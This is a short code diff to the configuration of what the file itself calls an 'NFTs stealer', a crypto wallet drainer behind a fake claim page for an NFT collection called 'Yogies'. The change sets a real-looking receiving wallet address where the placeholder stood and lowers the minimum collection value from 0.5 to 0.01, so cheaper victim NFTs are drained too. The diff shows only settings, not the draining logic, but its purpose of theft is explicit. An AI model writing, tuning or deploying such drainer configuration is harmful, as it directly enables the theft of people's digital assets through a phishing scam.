@@ -1,4 +1,4 @@
-const receiver = "here";
+const receiver = "0x80B0dfC12b4d4f4Bf35277daA644347Ba586b3de";
 
 const collectionInfo = {
     name: "Yogies",
@@ -34,7 +34,7 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true, // Active (true) or not (false) NFTs stealer.
-    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.01, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
